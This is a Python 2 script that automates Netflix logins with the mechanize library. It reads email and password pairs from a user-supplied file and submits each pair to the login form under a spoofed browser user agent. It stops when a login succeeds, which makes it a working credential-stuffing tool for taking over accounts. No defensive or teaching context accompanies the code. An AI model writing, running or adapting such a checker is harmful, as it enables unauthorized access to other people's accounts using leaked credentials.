#! python2

import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_robots(False)
#br.addheaders=[('User-agent','Chrome')]
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
#f = open('netflixNew01.txt','r')
f = open('cleanNetflix.txt','r')
filename = raw_input()
f = open(filename,'r')
data = f.read().split('\n')
url = 'https://www.netflix.com/in/login'
br.open(url)
#br.open('https://www.netflix.com/in/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse')
for x in range(0,len(data)-1,2):
    br.select_form(nr=0)
    br.form['email'] = data[x] 
    br.form['password'] = data[x+1]
    print "Checking for " + br.form['email']+"\t"+ br.form['password']
    sub = br.submit()
    if url!= sub.geturl():
        print "DONE"
        break
    print sub.geturl()
    '''
    if sub.geturl() == "https://www.netflix.com/browse":
        print "Password is : ",br.form['password']
        break
        '''

